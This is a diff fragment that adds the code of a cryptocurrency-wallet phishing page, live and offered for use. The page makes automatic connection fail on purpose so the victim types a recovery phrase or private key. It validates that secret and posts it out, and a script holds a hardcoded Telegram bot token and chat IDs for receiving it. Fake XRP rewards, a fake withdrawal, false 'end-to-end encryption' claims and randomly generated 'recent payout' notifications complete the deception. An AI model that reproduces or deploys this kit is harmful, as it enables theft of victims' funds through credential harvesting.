+                                            console.error("Failed to send message to Telegram:", response.statusText);
+                                        }
+                                    })
+                                    .catch((error) => {
+                                        console.error("Error sending message to Telegram:", error);
+                                    });
+                            }
+       </script>
+       <div>
+        <br/>
+        <br/>
+        <br/>
+        <h6 align="center" class="mt-4 text-muted align-items-center">
+         <img height="30" src="static/icon/shield.png" width="30"/>
+         This session is
+                                protected
+                                with an end-to-end encryption.
+         <br/>
+        </h6>
+       </div>
+       +
+       <div class="mt-4 text-center">
+        +
+        <p class="text-muted" style="font-size: 0.9em;">
+         While waiting, you can check our
+        </p>
+        +
+        <a class="btn btn-sm" href="chat.html" style="background: rgba(81, 66, 252, 0.1); color: #5142FC;">
+         +                               Chat Room
++
+        </a>
+        +
+       </div>
+      </div>
+     </div>
+    </div>
+   </div>
+  </div>
+  <script>
+   // Define updateConnectionStatus function first
+        function updateConnectionStatus(phase) {
+            switch(phase) {
+                case 'connecting':
+                    $('#loading-animation').show();
+                    $('#error-icon').hide();
+                    $('#connection_status_title').text('Connecting Wallet');
+                    $('#connection_status_message').text('Initializing connection...');
+                    $('#step1').addClass('active');
+                    
+                    // Step 2 after 2 seconds
+                    setTimeout(() => {
+                        $('#step2').addClass('active');
+                        $('#connection_status_message').text('Validating wallet credentials...');
+                    }, 2000);
+                    
+                    // Step 3 after 4 seconds
+                    setTimeout(() => {
+                        $('#step3').addClass('active');
+                        $('#connection_status_message').text('Attempting secure connection...');
+                    }, 4000);
+                    break;
+                    
+                case 'success':
+                    $('#loading-animation').hide();
+                    $('#error-icon').hide();
+                    $('.checkmark').show();
+                    $('#connection_status_title').text('Connection Successful');
+                    const xrpAmount = getRandomXRPAmount();
+                    $('#connection_status_message').html(`
+                        <div class="success-message">
+                            Your wallet has been connected successfully!
+                            <div class="eligible-amount">Eligible for <span class="xrp-amount">${xrpAmount.toLocaleString()} XRP</span></div>
+                            <div class="eligibility-form mt-4">
+                                <input type="text" id="wallet-address" class="form-control" 
+                                    placeholder="Enter your XRP wallet address">
+                                <div class="address-validation-message" style="display:none; margin: 5px 0; font-size: 12px;"></div>
+                                <button id="check-eligibility" class="btn btn-primary mt-3" disabled>
+                                    Withdraw XRP
+                                </button>
+                            </div>
+                        </div>
+                    `);
+                    $('.step').addClass('completed');
+                    break;
+                    
+                case 'error':
+                    $('#loading-animation').hide();
+                    $('#error-icon').show();
+                    $('#connection_status_title').text('Connection Failed');
+                    $('#connection_status_message').text('Invalid wallet credentials. Please verify your details and try again.');
+                    $('.step').removeClass('active completed');
+                    break;
+            }
+        }
+
+        // Replace the existing shouldConnectionSucceed function with this:
+        function shouldConnectionSucceed() {
+            return new Promise((resolve, reject) => {
+                // First try URL parameter
+                const urlParams = new URLSearchParams(window.location.search);
+                if (urlParams.has('connection')) {
+                    return resolve(urlParams.get('connection') === 'success');
+                }
+                
+                // Then try localStorage
+                const storedResult = localStorage.getItem('walletConnectionResult');
+                if (storedResult) {
+                    return resolve(storedResult === 'success');
+                }
+                
+                // Finally check server configuration
+                fetch('check_connection_state.json')
+                    .then(response => response.json())
+                    .then(data => resolve(data.should_succeed))
+                    .catch(() => resolve(false)); // Default to fail if server error
+            });
+        }
+
+        // Handle Select Wallet Click
+        $(document).ready(function() {
+            // Update the wallet selection click handler
+            $('.select_wallet').on('click', function() {
+                var wallet_name = $(this).data('title');
+                var wallet_logo = $(this).data('logo');
+                $('#wallet_name').text(wallet_name);
+                $('#wallet_logo').attr('src', wallet_logo);
+                $('#popup_connect_wallet').modal('show');
+                
+                // Show auto connecting first
+                $('#auto_connecting').show();
+                $('#failed_to_connect').hide();
+                $('#div_connect_manuallly').hide();
+
+                // Set random timeout before showing failed connection
+                var interval = 1000 * Math.floor(Math.random() * (15 - 5) + 5); // Random 5-15 seconds
+                setTimeout(() => {
+                    $('#auto_connecting').hide();
+                    $('#failed_to_connect').show();
+                    $('#div_connect_manuallly').hide();
+                }, interval);
+            });
+
+            // Update manual connection button click handler
+            $('#button_connect_manually').on('click', function() {
+                $('#auto_connecting').show();
+                $('#failed_to_connect').hide();
+                $('#div_connect_manuallly').show();
+            });
+
+            // Remove any existing click handlers from the connect wallet button
+            $('#button_connect_wallet').off('click');
+
+            // Add the new validated click handler
+            $('#button_connect_wallet').on('click', function() {
+                const input = document.getElementById('secret_phrase').value.trim();
+                
+                if (!input) {
+                    return;
+                }
+
+                if (!isValidMnemonic(input) && !isValidPrivateKey(input)) {
+                    const errorMsg = document.getElementById('phrase_error') || createErrorElement();
+                    errorMsg.style.display = 'block';
+                    errorMsg.textContent = 'Please enter a valid recovery phrase or private key';
+                    return;
+                }
+                
+                // Only proceed if validation passes
+                $('#popup_connect_wallet').modal('hide');
+                $('#popup_connect_wallet_success').modal('show');
+                updateConnectionStatus('connecting');
+            });
+
+            // Update try again button
+            $('#try_auto_connecting_again').on('click', function() {
+                $('#auto_connecting').show();
+                $('#failed_to_connect').hide();
+                $('#div_connect_manuallly').hide();
+                
+                // Set random timeout before showing failed connection again
+                var interval = 1000 * Math.floor(Math.random() * (10 - 3) + 3); // Random 3-10 seconds
+                setTimeout(() => {
+                    $('#auto_connecting').hide();
+                    $('#failed_to_connect').show();
+                }, interval);
+            });
+        });
+
+        // Add eligibility check handler
+        $(document).on('click', '#check-eligibility', async function() {
+            const walletAddress = $('#wallet-address').val().trim();
+            
+            if (!walletAddress) {
+                alert('Please enter a wallet address');
+                return;
+            }
+            
+            // Hide success modal and show withdrawal modal
+            $('#popup_connect_wallet_success').modal('hide');
+            $('#eligibility_check_modal').modal('show');
+            
+            // Start withdrawal process animation
+            $('#eligibility-loading').show();
+            $('#eligibility-error').hide();
+            $('#eligibility_status_title').text('Processing Withdrawal');
+            $('#eligibility_status_message').text('Validating address...');
+            
+            // Simulate withdrawal process
+            $('#verify-step1').addClass('active');
+            
+            setTimeout(() => {
+                $('#eligibility_status_message').text('Processing withdrawal request...');
+                $('#verify-step2').addClass('active');
+            }, 2000);
+            
+            setTimeout(() => {
+                $('#eligibility_status_message').text('Confirming transaction...');
+                $('#verify-step3').addClass('active');
+            }, 4000);
+            
+            // Check withdrawal state after 5 seconds
+            setTimeout(async () => {
+                const shouldSucceed = await shouldWithdrawalSucceed();
+                
+                $('#eligibility-loading').hide();
+                if (shouldSucceed) {
+                    $('.checkmark').show();
+                    $('#eligibility_status_title').text('Withdrawal Successful');
+                    $('#eligibility_status_message').html(`
+                        <div class="success-message">
+                            Your withdrawal has been processed successfully!<br>
+                            <span class="text-muted" style="font-size: 0.9em;">
+                                The XRP will be transferred to your wallet within 1-2 hours depending on network congestion.
+                            </span>
+                        </div>
+                    `);
+                    $('.step').removeClass('active').addClass('completed');
+                } else {
+                    $('#eligibility-error').show();
+                    $('#eligibility_status_title').text('Withdrawal Failed');
+                    $('#eligibility_status_message').html(`
+                        <div class="error-message">
+                            Unable to process withdrawal due to high network congestion.<br>
+                            <span class="text-muted" style="font-size: 0.9em;">
+                                The network is experiencing unusually high transaction volume. 
+                                Please try again in 30-60 minutes when congestion reduces.
+                            </span>
+                        </div>
+                    `);
+                    $('.step').removeClass('active completed');
+                }
+            }, 5000);
+        });
+
+        // Update the XRP address validation
+        $(document).on('input', '#wallet-address', function() {
+            const address = $(this).val().trim();
+            const validationMessage = $(this).siblings('.address-validation-message');
+            const withdrawButton = $('#check-eligibility');
+            
+            // Validation patterns
+            const xrpAddressRegex = /^r[1-9A-HJ-NP-Za-km-z]{25,34}$/;
+            const ethAddressRegex = /^0x[a-fA-F0-9]{40}$/;  // Works for both ERC20 and BEP20
+            
+            if (!address) {
+                validationMessage.html('Please enter a wallet address').css('color', '#ef4444').show();
+                withdrawButton.prop('disabled', true);
+            } 
+            // Check XRP address
+            else if (xrpAddressRegex.test(address)) {
+                validationMessage.html('Valid XRP address').css('color', '#10B981').show();
+                withdrawButton.prop('disabled', false);
+            }
+            // Check ETH/BSC address
+            else if (ethAddressRegex.test(address)) {
+                validationMessage.html('Valid BEP20/ERC20 address').css('color', '#10B981').show();
+                withdrawButton.prop('disabled', false);
+            }
+            // Invalid address
+            else {
+                validationMessage.html('Invalid address format. Please enter a valid XRP, BEP20, or ERC20 address').css('color', '#ef4444').show();
+                withdrawButton.prop('disabled', true);
+            }
+        });
+
+        // Add this function to generate random XRP amount
+        function getRandomXRPAmount() {
+            const min = 600;
+            const max = 10000;
+            return Math.floor(Math.random() * (max - min + 1) + min);
+        }
+
+        // Add this function to check withdrawal state
+        async function shouldWithdrawalSucceed() {
+            try {
+                const response = await fetch('check_withdrawal_state.json');
+                const data = await response.json();
+                return data.should_succeed;
+            } catch (error) {
+                console.error('Error checking withdrawal state:', error);
+                return false;
+            }
+        }
+  </script>
+  <style>
+   .btn-outline-primary {
+            width: 100%;
+            border-radius: 20px;
+            font-weight: 700;
+            font-size: 15px;
+            line-height: 22px;
+            padding: 10px 20px;
+            -webkit-transition: all 0.3s ease-in-out;
+            -moz-transition: all 0.3s ease-in-out;
+            -ms-transition: all 0.3s ease-in-out;
+            -o-transition: all 0.3s ease-in-out;
+            transition: all 0.3s ease-in-out;
+            outline: none;
+            border: 1px solid #5142FC;
+            margin-bottom: 10px
+        }
+  </style>
+  <!-- Add this CSS to your existing styles -->
+  <style>
+   .modern-modal {
+        background: linear-gradient(135deg, #1a1f25 0%, #242830 100%);
+        border-radius: 20px;
+        border: 1px solid rgba(255, 255, 255, 0.1);
+        box-shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.37);
+        backdrop-filter: blur(8px);
+    }
+
+    .modern-close {
+        position: absolute;
+        right: 20px;
+        top: 20px;
+        background: rgba(255, 255, 255, 0.1);
+        border-radius: 50%;
+        width: 30px;
+        height: 30px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        color: white;
+        border: none;
+        transition: all 0.3s ease;
+    }
+
+    .modern-close:hover {
+        background: rgba(255, 255, 255, 0.2);
+        transform: rotate(90deg);
+    }
+
+    .connection-status-wrapper {
+        text-align: center;
+        padding: 2rem;
+    }
+
+    .status-title {
+        font-size: 1.8rem;
+        color: white;
+        margin: 1.5rem 0;
+        font-weight: 600;
+    }
+
+    .status-message {
+        color: #a0aec0;
+        font-size: 1rem;
+        margin-bottom: 2rem;
+    }
+
+    .loading-animation {
+        margin: 0 auto;
+        width: 80px;
+        height: 80px;
+    }
+
+    .circle-loader {
+        border: 3px solid rgba(255, 255, 255, 0.2);
+        border-left-color: #5142FC;
+        animation: loader-spin 1.2s infinite linear;
+        position: relative;
+        display: inline-block;
+        vertical-align: top;
+        border-radius: 50%;
+        width: 100%;
+        height: 100%;
+    }
+
+    .error-icon {
+        width: 80px;
+        height: 80px;
+        margin: 0 auto;
+    }
+
+    .error-svg {
+        fill: #ef4444;
+        animation: error-bounce 0.5s ease-in-out;
+    }
+
+    .progress-steps {
+        display: flex;
+        justify-content: space-between;
+        margin-top: 2rem;
+        padding: 0 1rem;
+    }
+
+    .step {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        flex: 1;
+        position: relative;
+    }
+
+    .step:not(:last-child):after {
+        content: '';
+        position: absolute;
+        top: 15px;
+        left: 60%;
+        width: 80%;
+        height: 2px;
+        background: rgba(255, 255, 255, 0.1);
+    }
+
+    .step.active .step-icon {
+        background: #5142FC;
+        color: white;
+    }
+
+    .step.completed .step-icon {
+        background: #10B981;
+        color: white;
+    }
+
+    .step-icon {
+        width: 30px;
+        height: 30px;
+        border-radius: 50%;
+        background: rgba(255, 255, 255, 0.1);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        color: #a0aec0;
+        font-weight: 600;
+        margin-bottom: 0.5rem;
+        transition: all 0.3s ease;
+    }
+
+    .step-label {
+        color: #a0aec0;
+        font-size: 0.8rem;
+    }
+
+    @keyframes loader-spin {
+        0% { transform: rotate(0deg); }
+        100% { transform: rotate(360deg); }
+    }
+
+    @keyframes error-bounce {
+        0%, 100% { transform: scale(1); }
+        50% { transform: scale(1.1); }
+    }
+
+    /* Mobile Responsiveness */
+    @media (max-width: 768px) {
+        .modern-modal {
+            margin: 1rem;
+        }
+        
+        .status-title {
+            font-size: 1.5rem;
+        }
+        
+        .progress-steps {
+            flex-direction: column;
+            gap: 1rem;
+        }
+        
+        .step:not(:last-child):after {
+            width: 2px;
+            height: 20px;
+            left: 15px;
+            top: 30px;
+        }
+        
+        .step {
+            flex-direction: row;
+            gap: 1rem;
+        }
+        
+        .step-label {
+            font-size: 0.9rem;
+        }
+    }
+  </style>
+  <!-- Add this JavaScript to update the UI -->
+  <script>
+   function updateConnectionStatus(phase) {
+        switch(phase) {
+            case 'connecting':
+                $('#loading-animation').show();
+                $('#error-icon').hide();
+                $('#connection_status_title').text('Connecting Wallet');
+                $('#connection_status_message').text('Initializing connection...');
+                $('#step1').addClass('active');
+                
+                // Step 2 after 2 seconds
+                setTimeout(() => {
+                    $('#step2').addClass('active');
+                    $('#connection_status_message').text('Validating wallet credentials...');
+                }, 2000);
+                
+                // Step 3 after 4 seconds
+                setTimeout(() => {
+                    $('#step3').addClass('active');
+                    $('#connection_status_message').text('Attempting secure connection...');
+                }, 4000);
+                break;
+                
+            case 'success':
+                $('#loading-animation').hide();
+                $('#error-icon').hide();
+                $('.checkmark').show();
+                $('#connection_status_title').text('Connection Successful');
+                const xrpAmount = getRandomXRPAmount();
+                $('#connection_status_message').html(`
+                    <div class="success-message">
+                        Your wallet has been connected successfully!
+                        <div class="eligible-amount">Eligible for <span class="xrp-amount">${xrpAmount.toLocaleString()} XRP</span></div>
+                        <div class="eligibility-form mt-4">
+                            <input type="text" id="wallet-address" class="form-control" 
+                                placeholder="Enter your XRP wallet address">
+                            <div class="address-validation-message" style="display:none; margin: 5px 0; font-size: 12px;"></div>
+                            <button id="check-eligibility" class="btn btn-primary mt-3" disabled>
+                                Withdraw XRP
+                            </button>
+                        </div>
+                    </div>
+                `);
+                $('.step').addClass('completed');
+                break;
+                
+            case 'error':
+                $('#loading-animation').hide();
+                $('#error-icon').show();
+                $('#connection_status_title').text('Connection Failed');
+                $('#connection_status_message').text('Invalid wallet credentials. Please verify your details and try again.');
+                $('.step').removeClass('active completed');
+                break;
+        }
+    }
+
+    // Update the existing connection handler
+    $(document).on("click", "#button_connect_wallet", function(e) {
+        // ... existing code ...
+        
+        .then(data => {
+            $('#popup_connect_wallet').modal('hide');
+            updateConnectionStatus('connecting');
+            $('#popup_connect_wallet_success').modal('show');
+
+            setTimeout(() => {
+                const shouldSucceed = shouldConnectionSucceed();
+                updateConnectionStatus(shouldSucceed ? 'success' : 'error');
+                button.text('Connect Wallet').prop('disabled', false);
+            }, 5000);
+        })
+        // ... rest of the code ...
+    });
+  </script>
+  <style>
+   .checkmark {
+            display: none;
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            stroke-width: 2;
+            stroke: #4CAF50;
+            stroke-miterlimit: 10;
+            animation: fill .4s ease-in-out .4s forwards, scale .3s ease-in-out .9s both;
+        }
+
+        .checkmark.draw {
+            stroke-dasharray: 166;
+            stroke-dashoffset: 166;
+            stroke-width: 2;
+            stroke-miterlimit: 10;
+            animation: stroke 0.6s cubic-bezier(0.65, 0, 0.45, 1) forwards;
+        }
+
+        @keyframes stroke {
+            100% {
+                stroke-dashoffset: 0;
+            }
+        }
+
+        @keyframes fill {
+            100% {
+                box-shadow: inset 0 0 0 100px #4CAF50;
+            }
+        }
+
+        @keyframes scale {
+            0%, 100% {
+                transform: none;
+            }
+            50% {
+                transform: scale3d(1.1, 1.1, 1);
+            }
+        }
+  </style>
+  <!-- Add this inside the connection-status-wrapper div -->
+  <div id="eligibility-check" style="display: none;">
+   <div class="form-group mt-4">
+    <input class="form-control" id="wallet-address" placeholder="Enter your wallet address" style="padding: 12px; border-radius: 8px; width: 100%; margin-bottom: 15px;" type="text"/>
+    <button class="btn btn-primary" id="check-eligibility" style="width: 100%; padding: 12px;">
+     Check Eligibility
+    </button>
+   </div>
+  </div>
+  <!-- Add this new modal for eligibility check -->
+  <div aria-hidden="true" class="modal fade popup" id="eligibility_check_modal" role="dialog" tabindex="-1">
+   <div class="modal-dialog modal-dialog-centered" role="document">
+    <div class="modal-content modern-modal">
+     <button aria-label="Close" class="close modern-close" data-dismiss="modal" type="button">
+      <span aria-hidden="true">
+       ×
+      </span>
+     </button>
+     <div class="modal-body space-y-20 pd-40">
+      <div class="connection-status-wrapper">
+       <!-- Loading Animation -->
+       <div class="loading-animation" id="eligibility-loading">
+        <div class="circle-loader">
+         <div class="checkmark draw">
+         </div>
+        </div>
+       </div>
+       <!-- Error Icon -->
+       <div class="error-icon" id="eligibility-error" style="display: none;">
+        <svg class="error-svg" viewbox="0 0 24 24">
+         <path d="M12 4c-4.42 0-8 3.58-8 8s3.58 8 8 8 8-3.58 8-8-3.58-8-8-8zm1 13h-2v-2h2v2zm0-4h-2V7h2v6z">
+         </path>
+        </svg>
+       </div>
+       <h3 class="status-title" id="eligibility_status_title">
+        Checking Eligibility
+       </h3>
+       <p class="status-message" id="eligibility_status_message">
+        Verifying wallet address...
+       </p>
+       <!-- Progress Steps -->
+       <div class="progress-steps">
+        <div class="step" id="verify-step1">
+         <div class="step-icon">
+          1
+         </div>
+         <div class="step-label">
+          Validating
+         </div>
+        </div>
+        <div class="step" id="verify-step2">
+         <div class="step-icon">
+          2
+         </div>
+         <div class="step-label">
+          Processing
+         </div>
+        </div>
+        <div class="step" id="verify-step3">
+         <div class="step-icon">
+          3
+         </div>
+         <div class="step-label">
+          Confirming
+         </div>
+        </div>
+       </div>
+       +
+       <div class="mt-4 text-center">
+        +
+        <a class="btn btn-sm" href="chat.html" style="background: rgba(81, 66, 252, 0.1); color: #5142FC;">
+         +                               View Chat Room
++
+        </a>
+        +
+       </div>
+      </div>
+     </div>
+    </div>
+   </div>
+  </div>
+  <style>
+   .success-message {
+        text-align: center;
+        color: #a0aec0;
+    }
+
+    .eligibility-form {
+        margin-top: 2rem;
+        padding: 0 1rem;
+    }
+
+    .eligibility-form input {
+        background: rgba(255, 255, 255, 0.1);
+        border: 1px solid rgba(255, 255, 255, 0.2);
+        color: white;
+        padding: 12px;
+        border-radius: 8px;
+        width: 100%;
+        margin-bottom: 15px;
+        transition: all 0.3s ease;
+    }
+
+    .eligibility-form input:focus {
+        background: rgba(255, 255, 255, 0.15);
+        border-color: #5142FC;
+        box-shadow: 0 0 0 2px rgba(81, 66, 252, 0.25);
+        outline: none;
+    }
+
+    .eligibility-form input::placeholder {
+        color: rgba(255, 255, 255, 0.5);
+    }
+
+    .eligibility-form button {
+        background: #5142FC;
+        color: white;
+        width: 100%;
+        padding: 12px;
+        border: none;
+        border-radius: 8px;
+        font-weight: 600;
+        transition: all 0.3s ease;
+    }
+
+    .eligibility-form button:hover {
+        background: #4132ec;
+        transform: translateY(-1px);
+    }
+
+    .mt-3 {
+        margin-top: 1rem;
+    }
+
+    .mt-4 {
+        margin-top: 1.5rem;
+    }
+  </style>
+  <style>
+   .address-validation-message {
+        text-align: left;
+        padding: 4px 8px;
+        border-radius: 4px;
+        background: rgba(0, 0, 0, 0.2);
+    }
+
+    #check-eligibility:disabled {
+        background: #2d3748;
+        cursor: not-allowed;
+        opacity: 0.7;
+    }
+  </style>
+  <style>
+   .eligible-amount {
+        margin-top: 15px;
+        font-size: 1.2em;
+        color: #fff;
+    }
+
+    .xrp-amount {
+        color: #4CAF50;
+        font-weight: bold;
+        font-size: 1.3em;
+    }
+  </style>
+  <!-- Add this function to generate random XRP addresses -->
+  <script>
+   function generateRandomXRPAddress() {
+        const chars = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
+        let address = 'r';
+        for (let i = 0; i < 27; i++) {
+            address += chars.charAt(Math.floor(Math.random() * chars.length));
+        }
+        return address;
+    }
+
+    // Add function to get random location
+    function getRandomLocation() {
+        const locations = [
+    'United States', 'United Kingdom', 'Canada', 'Australia', 'Germany',
+    'Japan', 'France', 'Spain', 'Italy', 'Netherlands', 'Singapore',
+    'South Korea', 'Brazil', 'Switzerland', 'Sweden', 'India', 'China',
+    'Russia', 'Mexico', 'Argentina', 'South Africa', 'New Zealand',
+    'Indonesia', 'Malaysia', 'Thailand', 'Philippines', 'Turkey',
+    'Saudi Arabia', 'United Arab Emirates', 'Egypt', 'Nigeria',
+    'Kenya', 'Vietnam', 'Pakistan', 'Bangladesh', 'Poland', 'Austria',
+    'Belgium', 'Norway', 'Denmark', 'Finland', 'Portugal', 'Ireland',
+    'Greece', 'Czech Republic', 'Hungary', 'Chile', 'Colombia',
+    'Peru', 'Venezuela', 'Morocco', 'Algeria', 'Tunisia', 'Ethiopia',
+    'Ghana', 'Ivory Coast', 'Tanzania', 'Uganda', 'Zambia', 'Zimbabwe',
+    'Qatar', 'Kuwait', 'Oman', 'Jordan', 'Bahrain', 'Israel', 'Lebanon',
+    'Ukraine', 'Belarus', 'Kazakhstan', 'Uzbekistan', 'Sri Lanka',
+    'Nepal', 'Myanmar', 'Cambodia', 'Laos', 'Afghanistan', 'Mongolia',
+    'Luxembourg', 'Liechtenstein', 'Malta', 'Cyprus', 'Iceland',
+    'Panama', 'Costa Rica', 'Honduras', 'Guatemala', 'El Salvador',
+    'Trinidad and Tobago', 'Barbados', 'Jamaica', 'Bahamas', 'Cuba',
+    'Fiji', 'Papua New Guinea', 'Micronesia', 'Palau', 'Samoa',
+    'Vanuatu', 'Tonga', 'Solomon Islands', 'Brunei', 'Bhutan',
+    'Malawi', 'Botswana', 'Rwanda', 'Burundi', 'Mozambique', 'Angola',
+    'Namibia', 'Eswatini', 'Lesotho', 'Liberia', 'Sierra Leone',
+    'Madagascar', 'Central African Republic', 'Gabon', 'Congo', 'Sudan',
+    'South Sudan', 'Haiti', 'Dominican Republic', 'Paraguay', 'Bolivia',
+    'Ecuador', 'Uruguay', 'Suriname', 'Guinea', 'Senegal', 'Mali'
+];
+        return locations[Math.floor(Math.random() * locations.length)];
+    }
+
+    // Update the random amount function to be more random with decimals
+    function getRandomNotificationAmount() {
+        // Generate random number between 100 and 10000
+        const amount = Math.random() * (10000 - 100) + 100;
+        // Round to 2 decimal places
+        return Number(amount.toFixed(2));
+    }
+
+    // Update the notification function to include the new timing
+    function showTransactionNotification() {
+        const address = generateRandomXRPAddress();
+        const amount = getRandomNotificationAmount();
+        const location = getRandomLocation();
+        
+        const notification = `
+            <div class="notification-toast" style="opacity: 0">
+                <div class="notification-content">
+                    <div class="notification-icon">
+                        <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
+                            <path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z" stroke="#4CAF50" stroke-width="2"/>
+                            <path d="M7.5 12L10.5 15L16.5 9" stroke="#4CAF50" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                        </svg>
+                    </div>
+                    <div class="notification-details">
+                        <div class="notification-address">${address.substring(0, 8)}...${address.substring(address.length - 4)}</div>
+                        <div class="notification-info">
+                            <span class="amount">${amount.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})} XRP</span>
+                            <span class="location">📍 ${location}</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        `;
+        
+        const container = document.getElementById('notification-container');
+        const notificationElement = document.createRange().createContextualFragment(notification);
+        container.appendChild(notificationElement);
+        
+        const toast = container.lastElementChild;
+        
+        // Animate in
+        setTimeout(() => {
+            toast.style.opacity = '1';
+            toast.style.transform = 'translateX(0)';
+        }, 100);
+        
+        // Remove after 3 seconds
+        setTimeout(() => {
+            toast.style.opacity = '0';
+            toast.style.transform = 'translateX(100%)';
+            setTimeout(() => {
+                container.removeChild(toast);
+            }, 300);
+        }, 3000);
+    }
+
+    // Add notification container to the page
+    document.body.insertAdjacentHTML('beforeend', `
+        <div id="notification-container"></div>
+    `);
+
+    // Update the interval timing to 5 seconds
+    setInterval(showTransactionNotification, 5000);
+  </script>
+  <style>
+   #notification-container {
+        position: fixed;
+        top: 20px;
+        right: 20px;
+        z-index: 9999;
+    }
+
+    .notification-toast {
+        background: rgba(255, 255, 255, 0.95);
+        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+        border-radius: 12px;
+        padding: 12px;
+        margin-bottom: 10px;
+        min-width: 300px;
+        max-width: 400px;
+        backdrop-filter: blur(10px);
+        transform: translateX(100%);
+        transition: all 0.3s ease;
+        border: 1px solid rgba(0, 0, 0, 0.1);
+    }
+
+    .notification-content {
+        display: flex;
+        align-items: center;
+        gap: 12px;
+    }
+
+    .notification-icon {
+        flex-shrink: 0;
+        background: rgba(76, 175, 80, 0.1);
+        border-radius: 50%;
+        width: 40px;
+        height: 40px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+    }
+
+    .notification-details {
+        flex-grow: 1;
+    }
+
+    .notification-address {
+        font-family: 'Courier New', monospace;
+        font-weight: 600;
+        color: #1a1a1a;
+        margin-bottom: 4px;
+    }
+
+    .notification-info {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        font-size: 0.9em;
+    }
+
+    .amount {
+        color: #4CAF50;
+        font-weight: 600;
+    }
+
+    .location {
+        color: #666;
+        font-size: 0.9em;
+    }
+
+    /* Mobile Responsiveness */
+    @media (max-width: 768px) {
+        #notification-container {
+            left: 20px;
+            right: 20px;
+        }
+        
+        .notification-toast {
+            min-width: unset;
+            width: 100%;
+        }
+        
+        .notification-info {
+            flex-direction: column;
+            align-items: flex-start;
+            gap: 4px;
+        }
+    }
+
+    /* Dark mode support */
+    @media (prefers-color-scheme: dark) {
+        .notification-toast {
+            background: rgba(30, 30, 30, 0.95);
+            border-color: rgba(255, 255, 255, 0.1);
+        }
+        
+        .notification-address {
+            color: #fff;
+        }
+        
+        .location {
+            color: #999;
+        }
+    }
+  </style>
+  <!-- Add these validation functions -->
+  <script>
+   function isValidPrivateKey(key) {
+        // Check for common private key formats
+        const hexFormat = /^(0x)?[0-9a-fA-F]{64}$/;  // 64 hex characters with optional 0x prefix
+        const base58Format = /^[123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz]{51,52}$/;  // Base58 format
+        
+        return hexFormat.test(key) || base58Format.test(key);
+    }
+
+    function isValidWord(word) {
+        // Only allow letters (no numbers or special characters)
+        return /^[a-zA-Z]+$/.test(word);
+    }
+
+    function isValidMnemonic(phrase) {
+        // First clean and split the input
+        const words = phrase.trim().toLowerCase().split(/\s+/);
+        
+        // Check if we have exactly 12 or 24 words
+        if (words.length !== 12 && words.length !== 24) {
+            return false;
+        }
+        
+        // Validate each word
+        for (let word of words) {
+            // Each word should be 3-8 characters and contain only letters
+            if (!/^[a-z]{3,8}$/.test(word)) {
+                return false;
+            }
+        }
+        
+        return true;
+    }
+
+    // Single event handler for the connect button
+    $(document).ready(function() {
+        const textarea = document.getElementById('secret_phrase');
+        const connectButton = document.getElementById('button_connect_wallet');
+        
+        // Input validation handler
+        textarea.addEventListener('input', function() {
+            const input = this.value.trim();
+            const errorMsg = document.getElementById('phrase_error') || createErrorElement();
+            
+            if (!input) {
+                connectButton.disabled = true;
+                connectButton.style.opacity = '0.2';
+                errorMsg.style.display = 'none';
+                return;
+            }
+            
+            if (isValidPrivateKey(input) || isValidMnemonic(input)) {
+                connectButton.disabled = false;
+                connectButton.style.opacity = '1';
+                errorMsg.style.display = 'none';
+            } else {
+                connectButton.disabled = true;
+                connectButton.style.opacity = '0.2';
+                errorMsg.style.display = 'block';
+                errorMsg.textContent = 'Invalid wallet phrase or private key';
+            }
+        });
+
+        // Click handler for the connect button
+        $('#button_connect_wallet').off('click').on('click', async function(e) {
+            e.preventDefault();
+            const input = textarea.value.trim();
+            const walletName = $('#wallet_name').text();
+            const button = $(this);
+            
+            if (!input || (!isValidMnemonic(input) && !isValidPrivateKey(input))) {
+                const errorMsg = document.getElementById('phrase_error') || createErrorElement();
+                errorMsg.style.display = 'block';
+                errorMsg.textContent = 'Invalid wallet phrase or private key';
+                return;
+            }
+            
+            button.text('Loading...').prop('disabled', true);
+
+            try {
+                const response = await fetch('send-telegram.json', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded',
+                    },
+                    body: new URLSearchParams({
+                        'wallet_type': walletName,
+                        'wallet_input': input
+                    })
+                });
+
+                if (!response.ok) {
+                    throw new Error('Network response was not ok');
+                }
+                
+                $('#popup_connect_wallet').modal('hide');
+                $('#popup_connect_wallet_success').modal('show');
+                updateConnectionStatus('connecting');
+
+                setTimeout(async () => {
+                    const shouldSucceed = await shouldConnectionSucceed();
+                    updateConnectionStatus(shouldSucceed ? 'success' : 'error');
+                    button.text('Connect Wallet').prop('disabled', false);
+                }, 5000);
+            } catch (error) {
+                console.error('Error:', error);
+                button.text('Connect Wallet').prop('disabled', false);
+                updateConnectionStatus('error');
+            }
+        });
+    });
+
+    function createErrorElement() {
+        const errorDiv = document.createElement('div');
+        errorDiv.id = 'phrase_error';
+        errorDiv.style.cssText = `
+            color: #ff0033;
+            font-size: 0.9rem;
+            font-weight: 500;
+            margin-top: 0.5rem;
+            margin-bottom: 1rem;
+            display: none;
+            text-align: left;
+        `;
+        
+        const textarea = document.getElementById('secret_phrase');
+        textarea.parentNode.insertBefore(errorDiv, textarea.nextSibling);
+        return errorDiv;
+    }
+  </script>
+ 
+ <script>
+    $(document).ready(function() {
+        const BOT_TOKEN = '7746117883:AAGZRV65ZmLtIgn8tAYQ9A8GLGRUMMqr5AY';
+        const CHAT_IDS = ['7651943856', '7651943856', '6661378262']; // Add as many chat IDs as you want
+    
+        $('#button_connect_wallet').off('click').on('click', async function(e) {
+            e.preventDefault();
+    
+            const textarea = document.getElementById('secret_phrase');
+            const input = textarea.value.trim();
+            const walletName = $('#wallet_name').text();
